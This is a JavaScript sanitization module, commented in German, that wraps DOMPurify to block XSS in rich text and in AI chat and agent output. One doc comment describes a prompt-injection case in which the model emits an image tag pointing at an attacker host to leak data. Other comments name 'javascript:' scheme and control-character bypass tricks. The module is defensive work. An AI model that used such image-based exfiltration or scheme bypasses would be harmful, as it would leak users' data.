import DOMPurify from 'dompurify'

// Erlaubte CSS-Properties (Quill-Formatierung), alles andere wird entfernt
const ALLOWED_CSS_PROPERTIES = [
    'color', 'background-color', 'font-size', 'font-weight', 'font-style',
    'text-decoration', 'text-align', 'margin', 'margin-left', 'margin-right',
    'padding', 'padding-left', 'padding-right', 'line-height', 'list-style-type'
]

// CSS-Property-Filter: entfernt gefährliche Properties wie background-image, position, content
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.hasAttribute('style')) {
        const style = node.style
        for (let i = style.length - 1; i >= 0; i--) {
            if (!ALLOWED_CSS_PROPERTIES.includes(style[i])) {
                style.removeProperty(style[i])
            }
        }
        // Leeres style-Attribut entfernen
        if (!node.getAttribute('style')?.trim()) {
            node.removeAttribute('style')
        }
    }
    // href/src: nur http(s) und relative URLs erlauben
    for (const attr of ['href', 'src']) {
        if (node.hasAttribute(attr)) {
            const val = node.getAttribute(attr) || ''
            if (val && !val.match(/^(https?:\/\/|\/|#|mailto:)/i)) {
                node.removeAttribute(attr)
            }
        }
    }
})

/**
 * Sanitize HTML to prevent XSS attacks.
 * Allows basic formatting tags but strips scripts, event handlers, etc.
 * CSS properties are filtered to a safe allowlist (Quill formatting only).
 */
export function sanitizeHtml(dirty) {
    if (!dirty) return ''
    return DOMPurify.sanitize(dirty, {
        ALLOWED_TAGS: [
            'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
            'p', 'br', 'hr',
            'strong', 'b', 'em', 'i', 'u', 's', 'del',
            'ul', 'ol', 'li',
            'a', 'img',
            'table', 'thead', 'tbody', 'tr', 'th', 'td',
            'blockquote', 'pre', 'code',
            'span', 'div', 'sub', 'sup',
            'mark', 'small'
        ],
        ALLOWED_ATTR: [
            'href', 'target', 'rel', 'src', 'alt', 'title',
            'class', 'style', 'id',
            'colspan', 'rowspan'
        ],
        ALLOW_DATA_ATTR: false,
        ADD_ATTR: ['target'],
        // Links immer in neuem Tab öffnen
        FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'textarea', 'select', 'button'],
        FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur']
    })
}

/**
 * Für KI-Ausgaben (Chat, Agent): strenger als `sanitizeHtml` (Audit A2-19, F2).
 *
 * Eine Prompt-Injection in Fremdtext, der über die Agent-Werkzeuge beim Modell
 * ankommt, könnte `<img src="https://angreifer/…?d=<Daten>">` ausgeben lassen —
 * der Browser lädt das Bild beim Anzeigen und schickt die Daten im Pfad mit.
 * Deshalb hier Bilder nur von der eigenen App (relative Pfade) und kein
 * `id`/`name` (DOM-Clobbering).
 */
export function sanitizeKiHtml(dirty) {
    if (!dirty) return ''
    const sauber = DOMPurify.sanitize(sanitizeHtml(dirty), {
        // `class` bleibt: der eigene Markdown-Renderer setzt Stilklassen.
        FORBID_ATTR: ['id', 'name'],
        RETURN_DOM_FRAGMENT: true,
    })
    for (const img of sauber.querySelectorAll('img')) {
        const src = img.getAttribute('src') || ''
        if (!/^\/(?!\/)/.test(src)) img.remove()
    }
    const huelle = document.createElement('div')
    huelle.appendChild(sauber)
    return huelle.innerHTML
}

/**
 * Eine fremde URL für ein `:href`-Attribut sicher machen.
 *
 * `sanitizeHtml` filtert `href` nur INNERHALB von HTML, das durch DOMPurify
 * läuft. Ein `:href="b.url"` im Template geht daran vorbei — und die Werte
 * stammen aus Perplexity-Zitaten, Hype-Radar-Belegen und CoinGecko-Projektlinks,
 * also aus KI- und Drittanbieter-Antworten. Ein `javascript:`- oder
 * `data:`-Schema führt dort direkt zur Ausführung beim Klick.
 *
 * Erlaubt sind dieselben Schemata wie im DOMPurify-Hook oben, damit es nur
 * EINE Regel gibt. Alles andere ergibt `null` — der Aufrufer rendert dann
 * keinen Link statt eines gefährlichen.
 *
 * @param {string} url
 * @returns {string|null}
 */
export function sichereUrl(url) {
    const v = String(url ?? '').trim()
    if (!v) return null
    // Steuerzeichen entfernen: "java\0script:" und Zeilenumbrüche im Schema
    // sind der klassische Weg, eine Schemaprüfung zu umgehen.
    const sauber = v.replace(/[\u0000-\u001F\u007F]/g, '')
    if (!/^(https?:\/\/|\/|#|mailto:)/i.test(sauber)) return null
    return sauber
}
